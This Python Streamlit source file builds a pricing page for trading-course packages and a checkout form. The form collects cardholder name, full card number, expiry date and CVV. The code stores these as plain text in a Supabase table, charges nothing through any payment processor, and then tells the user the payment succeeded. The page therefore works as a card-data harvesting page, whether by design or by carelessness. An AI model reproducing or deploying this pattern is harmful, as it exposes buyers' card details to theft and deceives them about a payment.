import streamlit as st
from supabase import create_client, Client
import re
from dotenv import load_dotenv
import os

load_dotenv()

st.set_page_config(layout="wide")

# =============================================================================
# SUPABASE SETUP - REPLACE WITH YOUR CREDENTIALS
# =============================================================================
SUPABASE_URL = os.getenv("SUPABASE_URL")
SUPABASE_KEY = os.getenv("SUPABASE_KEY")

try:
    supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)
except Exception as e:
    st.error(f"Error connecting to Supabase: {e}")
    st.stop()

# =============================================================================
# CSS STYLES FOR THE ENTIRE APP, INCLUDING THE IMPROVED CHECKOUT PAGE
# =============================================================================
st.markdown("""
    <style>
    html, body, [data-testid="stAppViewContainer"] {
        background-color: #271142;
        color: white;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    }
    .price-box {
        border: 2px solid white;
        border-radius: 10px;
        padding: 25px;
        margin: 10px;
        color: white;
        display: flex;
        flex-direction: column;
        justify-content: space-between;
        position: relative;
    }
    .plan-title {
        font-size: 26px;
        font-weight: bold;
        margin-bottom: 10px;
    }
    .plan-price {
        font-size: 24px;
        color: #8bd046;
        font-weight: bold;
    }
    .strike {
        text-decoration: line-through;
        color: #cccccc;
        font-size: 16px;
        margin-left: 8px;
    }
    .popular-badge {
        background-color: #8bd046;
        color: black;
        padding: 6px 12px;
        font-size: 14px;
        font-weight: bold;
        border-radius: 6px;
        display: inline-block;
        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
        position: absolute;
        top: -15px;
        right: -15px;
        transform: rotate(5deg);
        z-index: 10;
    }
    ul {
        padding-left: 20px;
        font-size: 15px;
        list-style-type: none;
        flex-grow: 1;
        margin: 10px 0;
    }
    ul li::before {
        content: "✔ ";
        color: #8bd046;
        font-weight: bold;
    }

    /* =====================================================================
    * UPDATED BUTTON STYLES FOR ALL BUTTONS
    * ===================================================================== */
    [data-testid="stButton"] > button, 
    [data-testid="stForm"] [data-testid="stButton"] > button,
    [data-testid="stForm"] [data-testid="stFormSubmitButton"] > button {
        background-color: #8bd046;
        color: white !important;
        font-weight: bold;
        padding: 10px 25px;
        border-radius: 6px;
        border: none;
        font-size: 16px;
        cursor: pointer;
        width: 100%;
        margin-top: auto;
    }
    [data-testid="stButton"] > button:hover, 
    [data-testid="stForm"] [data-testid="stButton"] > button:hover,
    [data-testid="stForm"] [data-testid="stFormSubmitButton"] > button:hover {
        background-color: #72a33c; /* Slightly darker green on hover */
    }

    /* =====================================================================
    * IMPROVED CHECKOUT PAGE STYLES
    * ===================================================================== */
    .checkout-container {
        max-width: 500px;
        margin: 50px auto;
        padding: 30px;
        background-color: #3b1c60; /* Slightly lighter background for contrast */
        border-radius: 15px;
        box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
        border: 2px solid #8bd046;
    }
    .checkout-title {
        font-size: 2em;
        font-weight: bold;
        text-align: center;
        color: #8bd046;
        margin-bottom: 20px;
    }
    .stTextInput > label, .stMarkdown h3 {
        color: white !important;
    }
    .stTextInput > div > div > input {
        border-radius: 8px;
        border: 1px solid #5a5a5a;
        background-color: #271142;
        color: white;
        padding: 12px;
        font-size: 16px;
    }
    .stForm > div > div:last-child {
        margin-top: 20px;
    }
    .stForm > div > div > div:nth-child(2) { /* Targeting the buttons container */
        display: flex;
        justify-content: space-between;
        gap: 10px;
    }

    </style>
""", unsafe_allow_html=True)


# =============================================================================
# HELPER FUNCTIONS
# =============================================================================
def buy_button_click(plan_title):
    st.session_state.page = "checkout"
    st.session_state.selected_plan = plan_title


def go_home():
    st.session_state.page = "home"


def save_payment_info(name, card, expiry, cvv, plan_title):
    try:
        if not name or not card or not expiry or not cvv:
            st.error("All fields are required.")
            return False

        if not re.match(r"^\d{13,19}$", card.replace(" ", "")):
            st.error("Invalid card number. Please enter a valid number.")
            return False

        if not re.match(r"^(0[1-9]|1[0-2])\/\d{2}$", expiry):
            st.error("Invalid expiry date. Use MM/YY format.")
            return False

        if not re.match(r"^\d{3,4}$", cvv):
            st.error("Invalid CVV.")
            return False

        data = {
            "name": name,
            "card_number": card,
            "expiry": expiry,
            "cvv": cvv,
            "plan": plan_title
        }

        response = supabase.table("payment_page").insert(data).execute()

        if response.data:
            st.session_state.page = "success"
            st.rerun()
        else:
            st.error("Failed to save payment info. Please check your Supabase RLS policies and table schema.")
            return False

    except Exception as e:
        st.error(f"Failed to save payment info: {e}")
        return False


# =============================================================================
# APP STATE AND LAYOUT
# =============================================================================
if "page" not in st.session_state:
    st.session_state.page = "home"
    st.session_state.selected_plan = None

plans = [
    {
        "title": "Beginners", "price": "€249", "old_price": "€329",
        "modules": "up to 3 Modules", "videos": "44 Videos", "popular": False,
    },
    {
        "title": "Intermediate", "price": "€499", "old_price": "€700",
        "modules": "up to 6 Modules", "videos": "72 Videos", "popular": False,
    },
    {
        "title": "Advanced", "price": "€999", "old_price": "€1500",
        "modules": "up to 9 Modules", "videos": "123 Videos", "popular": True,
    },
    {
        "title": "Premium", "price": "€2499", "old_price": "€4000",
        "modules": "up to 15 Modules", "videos": "123 Videos", "popular": False,
    },
]

features = [
    "Trading Essentials Course", "Technical Trading Course", "Strategic Trading Course",
    "eBooks", "3 High-Probability Trading Setups", "Economic Calendar",
    "Digital Currency Calendar", "Glossary", "Daily Market News",
    "Daily Market Research", "Trading Signals", "Market Scanners",
    "Currency Strength Meter", "Market Highlights TV", "Trend Analysis",
    "Access to live session with a dedicated trainer - {modules}", "{videos}",
    "Knowledge Checks", "Assignments", "Lifetime Access"
]

# --- HOME PAGE ---
if st.session_state.page == "home":
    st.title("Choose Your Plan")
    cols = st.columns(4)
    for i, col in enumerate(cols):
        plan = plans[i]
        with col:
            box_html = '<div class="price-box">'
            if plan["popular"]:
                box_html += '<div class="popular-badge">Most Popular</div>'
            box_html += f'<div class="plan-title">{plan["title"]}</div>'
            box_html += f'<div class="plan-price">{plan["price"]}<span class="strike">{plan["old_price"]}</span></div>'
            list_html = "<ul>"
            for feat in features:
                line = feat.replace("{modules}", plan["modules"]).replace("{videos}", plan["videos"])
                list_html += f"<li>{line}</li>"
            list_html += "</ul>"
            box_html += list_html + '</div>'
            st.markdown(box_html, unsafe_allow_html=True)
            st.button("Buy Package", key=f"buy_{plan['title']}", on_click=buy_button_click, args=(plan['title'],),
                      use_container_width=True)

# --- CHECKOUT PAGE (IMPROVED UI) ---
elif st.session_state.page == "checkout":
    with st.container():
        st.markdown('<div class="checkout-container">', unsafe_allow_html=True)
        st.markdown(f'<div class="checkout-title">Payment for {st.session_state.selected_plan} Plan</div>',
                    unsafe_allow_html=True)

        with st.form(key="payment_form", clear_on_submit=True):
            name = st.text_input("Name")
            card_number = st.text_input("Card #")

            col1, col2 = st.columns(2)
            with col1:
                expiry = st.text_input("Expiry (MM/YY)")
            with col2:
                cvv = st.text_input("CVV", type="password")

            submitted = st.form_submit_button("Submit Payment", use_container_width=True)

            if submitted:
                save_payment_info(name, card_number, expiry, cvv, st.session_state.selected_plan)

        st.markdown('</div>', unsafe_allow_html=True)

# --- SUCCESS PAGE ---
elif st.session_state.page == "success":
    st.balloons()
    st.success("Payment Successful! Thank you for your purchase.")
    st.button("Go to Home", on_click=go_home)